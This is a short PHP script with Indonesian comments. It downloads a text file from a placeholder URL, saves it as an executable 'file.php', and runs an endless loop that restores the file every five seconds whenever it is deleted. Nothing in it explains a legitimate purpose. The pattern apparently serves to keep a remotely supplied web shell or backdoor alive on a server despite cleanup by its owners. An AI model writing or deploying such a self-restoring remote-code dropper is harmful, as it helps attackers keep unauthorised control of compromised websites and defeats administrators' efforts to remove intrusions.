<?php
// URL file yang ingin diunduh
$url = 'https://example.com/file.txt'; // Ganti dengan URL file yang ingin diunduh
$filename = 'file.php'; // Nama file output yang diinginkan

// Fungsi untuk mengunduh file
function downloadFile($url, $filename) {
    // Menggunakan file_get_contents untuk mengunduh file
    $content = file_get_contents($url);
    if ($content === FALSE) {
        echo "Gagal mengunduh file dari URL: $url\n";
        return false;
    }
    
    // Menyimpan konten ke file
    file_put_contents($filename, $content);
    return true;
}

// Loop untuk memeriksa keberadaan file
while (true) {
    // Cek apakah file ada
    if (!file_exists($filename)) {
        // Jika file tidak ada, unduh kembali
        echo "File '$filename' tidak ditemukan. Mengunduh kembali...\n";
        downloadFile($url, $filename);
    } else {
        echo "File '$filename' ditemukan.\n";
    }
    
    // Tunggu 5 detik sebelum memeriksa lagi
    sleep(5);
}
?>
